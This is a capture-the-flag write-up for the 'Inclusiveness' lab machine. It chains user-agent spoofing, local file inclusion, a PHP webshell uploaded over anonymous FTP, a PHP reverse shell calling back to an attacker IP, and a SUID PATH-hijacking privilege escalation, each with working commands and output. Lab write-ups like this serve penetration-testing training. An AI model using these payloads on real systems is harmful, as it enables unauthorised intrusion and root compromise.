# Inclusiveness - Proving Grounds Practice

> **Kill Chain Summary**: User-Agent Spoofing (Googlebot) reveals hidden /secret_information/ endpoint -> Parameter LFI identified (?lang=) -> Uploading PHP Webshell via Anonymous FTP to /var/ftp/pub/ -> Triggering RCE via LFI inclusion -> Reverse Shell as www-data -> Source Code Review of /home/tom/rootshell.c reveals relative command execution (whoami) -> PATH Hijacking via /tmp -> Root Shell.

| Property | Value |
|---|---|
| **Target Name** | Inclusiveness |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux (Debian 10) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | User-Agent Header Spoofing (Googlebot), Local File Inclusion (LFI), Anonymous FTP Write, Cross-Service LFI-to-RCE, C Source Code Analysis, SUID Binary PATH Hijacking |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We perform a comprehensive TCP scan:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp $IP
```

**Open Ports Summary:**

| Port | Service | Version | Key Findings and Initial Vector |
|---|---|---|---|
| **21/tcp** | FTP | vsftpd 3.0.3 | Anonymous login allowed: /pub directory is writable |
| **22/tcp** | SSH | OpenSSH 7.9p1 | Standard Linux remote access |
| **80/tcp** | HTTP | Apache httpd 2.4.38 | Main web application |

---

### 1.2 Web Enumeration and User-Agent Spoofing (Port 80)

Browsing to `http://$IP/` displays an Apache test page. Directory fuzzing revealed `/manual/`, which yielded no actionable findings.

Inspecting `robots.txt` returned an empty response. However, web applications occasionally serve differing responses to search engine crawlers. Modifying the `User-Agent` header in Burp Suite to impersonate **Googlebot** reveals hidden contents:

```http
GET /robots.txt HTTP/1.1
Host: 192.168.x.x
User-Agent: Googlebot
Connection: close
```

**Response:**
```text
HTTP/1.1 200 OK
...
User-agent: *
Disallow: /secret_information/
```

Navigating to `http://$IP/secret_information/` presents an informational article discussing DNS Zone Transfers:

```text
http://$IP/secret_information/?lang=en.php
```

> Note on initial attempts: The article text discusses DNS reconnaissance (`dig axfr`, `host -l`). Initial testing against local DNS services confirmed the article was merely static background content. The real vulnerability lies within the dynamic parameter handling: `?lang=en.php`.

---

## 2. Initial Access

### 2.1 Local File Inclusion (LFI) Discovery

Testing directory traversal against the `lang` parameter:

```text
http://$IP/secret_information/?lang=../../../../../../etc/passwd
```

The server returns the full contents of `/etc/passwd`, confirming an unauthenticated LFI vulnerability.

---

### 2.2 Cross-Service RCE via Writable FTP

Standard log poisoning vectors (Apache logs, `/proc/self/environ`) were restricted. However, our initial Nmap scan confirmed that the FTP service on port 21 permits anonymous logins with write permissions in the `/pub` directory.

On Debian/Ubuntu vsftpd configurations, the default root directory for anonymous FTP is `/var/ftp/` or `/srv/ftp/`.

#### Step 1: Upload a PHP Webshell via FTP
Create a lightweight PHP command executor on Kali:

```bash
echo "<?php system(\$_GET['cmd']); ?>" > cmd.php
```

Connect to the FTP service and upload the file:

```bash
ftp $IP
# Name: anonymous
# Password: [blank]
ftp> cd pub
ftp> put cmd.php
ftp> ls
# -rw-r--r-- 1 ftp ftp 35 cmd.php
ftp> exit
```

#### Step 2: Trigger Code Execution via LFI
Target the uploaded file path (`/var/ftp/pub/cmd.php`) through the LFI parameter on port 80:

```text
http://$IP/secret_information/?lang=../../../../../../var/ftp/pub/cmd.php&cmd=whoami
```

**Response:**
```text
www-data
```

RCE is successfully established.

---

### 2.3 Reverse Shell and User Flag

To obtain an interactive shell, start a Netcat listener on Kali:

```bash
sudo nc -lvnp 4444
```

Send a URL-encoded reverse shell payload via the `cmd` parameter:

```text
http://$IP/secret_information/?lang=../../../../../../var/ftp/pub/cmd.php&cmd=php%20-r%20%27%24sock%3Dfsockopen(%22KALI_IP%22%2C4444)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

Catch the incoming connection:

```bash
connect to [KALI_IP] from [192.168.x.x]
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking user flag:
```bash
cat /home/tom/local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Internal Enumeration and SUID Binary Inspection

Navigating to `/home/tom` reveals a custom C source code file (`rootshell.c`) alongside a compiled SUID executable (`rootshell`):

```bash
ls -la /home/tom
# -rwsr-xr-x 1 root tom 16904 Jun 12  2020 rootshell
# -rw-r--r-- 1 tom  tom   380 Jun 12  2020 rootshell.c
```

The binary `rootshell` is owned by `root`, group `tom`, with the SUID bit (`-rwsr-xr-x`) set.

#### Source Code Analysis (rootshell.c)

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {
    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");
    char user[80];
    fgets(user, 80, f);
    printf("you are: %s\n", user);

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```

#### Vulnerability Analysis:
1. **Relative Path Execution:** The application executes `popen("whoami", "r")` using an unqualified relative command name (`whoami`) instead of the absolute path (`/usr/bin/whoami`).
2. **Path Resolution:** When resolving relative executable names, Linux traverses the directories listed in the `$PATH` environment variable in order.
3. **Privilege Elevation:** If `whoami` returns `tom`, the binary calls `setuid(geteuid())` (which sets the effective UID to root due to SUID) and spawns a root shell via `execlp("sh", ...)`.

---

### 3.2 Exploiting PATH Hijacking

To exploit this vulnerability:
1. Create an executable named `whoami` in a world-writable directory (`/tmp`) that prints `tom`.
2. Prepend `/tmp` to the current user's `$PATH`.
3. Execute `/home/tom/rootshell`.

```bash
# 1. Create malicious whoami executable in /tmp
cd /tmp
echo -n "tom" > whoami
chmod +x whoami

# 2. Prepend /tmp to the PATH variable
export PATH=/tmp:$PATH

# 3. Verify PATH precedence
which whoami
# Output: /tmp/whoami

# 4. Execute the vulnerable SUID binary
/home/tom/rootshell
```

**Execution Output:**
```bash
checking if you are tom...
you are: tom
access granted.
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

# whoami
root
```

### 3.3 Root Proof

```bash
cat /root/proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Spoof Googlebot User-Agent via curl
curl -s -A "Googlebot" http://[TARGET_IP]/robots.txt

# Anonymous FTP Upload
echo "<?php system(\$_GET['cmd']); ?>" > cmd.php
curl -T cmd.php ftp://[TARGET_IP]/pub/ --user anonymous:

# PATH Hijacking Exploit Sequence
echo -n "tom" > /tmp/whoami && chmod +x /tmp/whoami && PATH=/tmp:$PATH /home/tom/rootshell
```

---

## 5. Key Takeaways and Lessons Learned

1. **User-Agent Gating:** Static analysis of web servers should include testing crawler User-Agents (`Googlebot`, `Bingbot`). Firewalls and robots policies frequently reveal hidden directories exclusively to search engine crawlers.
2. **LFI + Writable File Upload = RCE:** Whenever an LFI is discovered without an immediate log poisoning vector, search for services that allow file uploads (FTP, SMB, TFTP, profile image uploads). Even if files cannot be accessed via direct HTTP URL paths, pointing the LFI to the upload folder (`/var/ftp/pub/`) achieves code execution.
3. **Inspect C Source Code for Relative Binaries:** Custom SUID binaries found in home directories or `/opt` should always be analyzed for functions like `system()`, `popen()`, or `exec()` calling commands without absolute paths (`/bin/cmd`).
4. **PATH Precedence:** Exporting `PATH=/tmp:$PATH` forces the operating system to resolve binaries in `/tmp` before system directories (`/usr/bin`, `/bin`), enabling instant SUID command hijacking.

---

### Tags
#linux #web #lfi #ftp #rce #path-hijacking #suid #c-code #pg-practice #easy #rooted